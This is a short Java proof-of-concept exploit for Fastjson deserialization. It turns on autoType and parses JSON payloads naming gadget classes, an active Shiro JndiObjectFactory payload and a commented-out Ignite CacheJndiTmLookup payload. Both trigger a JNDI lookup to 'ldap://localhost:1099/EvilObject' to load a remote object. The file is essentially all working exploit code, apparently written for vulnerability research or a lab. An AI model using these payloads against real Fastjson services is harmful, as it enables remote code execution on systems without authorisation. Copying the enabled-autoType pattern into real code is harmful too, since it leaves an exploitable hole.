import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.shiro.jndi.JndiObjectFactory;

public class Exp {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // poc 1
//        String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\"," +
//                " \"jndiNames\":[\"ldap://localhost:1099/EvilObject\"], \"tm\": {\"$ref\":\"$.tm\"}}";

        // poc 2
        String poc = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:1099/EvilObject\",\"instance\":{\"$ref\":\"$.instance\"}}";

        JSON.parse(poc);
    }
}